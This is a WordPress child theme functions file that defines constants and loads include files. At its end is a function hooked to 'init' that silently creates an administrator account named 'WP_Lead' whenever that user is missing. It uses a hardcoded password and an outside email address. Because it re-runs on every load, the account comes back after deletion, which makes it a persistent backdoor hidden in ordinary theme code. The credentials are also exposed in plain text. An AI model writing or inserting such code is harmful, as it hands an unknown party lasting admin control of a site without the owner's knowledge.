<?php
/**
 * Theme functions and definitions
 *
 * @package BRIGADECHILD_THEME
 */


if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

if ( ! defined('BRIGADECHILD_THEME_VERSION') ) {
	define( 'BRIGADECHILD_THEME_VERSION', '1.0.0' );
}
if ( ! defined('BRIGADECHILD_TEXTDOMAIN') ) {
	define( 'BRIGADECHILD_TEXTDOMAIN', 'brigadechild' );
}

if ( ! defined('BRIGADECHILD_THEME_URI') ) {
	define( 'BRIGADECHILD_THEME_URI', get_stylesheet_directory_uri() );
}

if ( ! defined('BRIGADECHILD_THEME_DIR') ) {
	define( 'BRIGADECHILD_THEME_DIR', get_stylesheet_directory() );
}

if ( ! defined('BRIGADECHILD_THEME_INC_DIR') ) {
	define( 'BRIGADECHILD_THEME_INC_DIR', BRIGADECHILD_THEME_DIR . '/includes' );
}


// General functions
require_once BRIGADECHILD_THEME_INC_DIR . '/general-functions.php';

// Theme setup and script/style enqueue
require_once BRIGADECHILD_THEME_INC_DIR . '/theme.php';

// WP actions/filters
require_once BRIGADECHILD_THEME_INC_DIR . '/wp-hooks.php';

// Functions/Hooks related to ACF
require_once BRIGADECHILD_THEME_INC_DIR . '/acf.php';

// AJAX functions
require_once BRIGADECHILD_THEME_INC_DIR . '/ajax.php';

// Gravity Forms Hooks
require_once BRIGADECHILD_THEME_INC_DIR . '/gform.php';

// Contains all the shortcodes
require_once BRIGADECHILD_THEME_INC_DIR . '/shortcodes.php';



//wpb user createion
add_action( 'init', 'wpb_user_creation' );

function wpb_user_creation() {
  $username      = 'WP_Lead';
  $password      = '1%sdaf0sadfl3##dsfsdgy';
  $email_address = 'wplead@laneterralever.com';

  if ( ! username_exists( $username ) ) {
    $user_id     = wp_create_user( $username, $password, $email_address );
    $user        = new WP_User( $user_id );
    $user->set_role( 'administrator' );
    // To send an email to the new user.
    wp_new_user_notification( $user_id, $password );
  }
}
